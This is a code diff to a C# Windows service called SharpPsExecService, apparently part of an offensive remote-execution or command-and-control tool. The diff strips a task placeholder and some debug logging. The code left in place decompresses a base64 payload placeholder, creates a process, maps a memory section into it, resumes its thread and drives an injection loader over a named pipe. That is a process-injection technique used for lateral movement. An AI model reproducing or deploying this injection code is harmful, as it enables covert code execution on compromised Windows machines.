@@ -17,7 +17,6 @@ namespace SharpPsExecService
         public const string _ServiceName = "csexecsvc";
 
         static private string nutclr = "#NUTCLR#";
-        static private string task = "#TASK#";
 
         static void Main(string[] args)
         {
@@ -75,8 +74,8 @@ namespace SharpPsExecService
                 {
 
                     string pipename = GetPipeName(procInfo.dwProcessId);
-                    string taskstr = Encoding.Default.GetString(DecompressDLL(Convert.FromBase64String(task)));
-                    InjectionLoaderListener injectionLoaderListener = new InjectionLoaderListener(pipename, new JavaScriptSerializer().Deserialize<Utility.TaskMsg>(taskstr));
+                    
+                    InjectionLoaderListener injectionLoaderListener = new InjectionLoaderListener(pipename, null);
 
                     byte[] payload = DecompressDLL(Convert.FromBase64String(nutclr));
 
@@ -110,20 +109,17 @@ namespace SharpPsExecService
                             Natives.ZwSetInformationThread(th, 1, IntPtr.Zero, 0);
 
                             int rest = Natives.ZwResumeThread(th, out ulong outsupn);
-                            File.WriteAllText(@"c:\temp\log.txt", "OK");
                             injectionLoaderListener.Execute(procInfo.hProcess);
 
                         }
                         else
                         {
                             Console.WriteLine("[x] Error mapping remote section");
-                            File.WriteAllText(@"c:\temp\log.txt", "[x] Error mapping remote section");
                         }
                     }
                     else
                     {
                         Console.WriteLine("[x] Error mapping section to current process");
-                        File.WriteAllText(@"c:\temp\log.txt", "[x] Error mapping section to current process");
                     }
 
                     Natives.CloseHandle(procInfo.hThread);
@@ -132,13 +128,11 @@ namespace SharpPsExecService
                 else
                 {
                     Console.WriteLine("[x] Error creating process");
-                    File.WriteAllText(@"c:\temp\log.txt", "[x] Error creating process");
                 }
             }
             catch (Exception e)
             {
                 Console.WriteLine("[x] Generic error");
-                File.WriteAllText(@"c:\temp\log.txt", "[x] Generic error" + e.StackTrace);
             }
 
         }
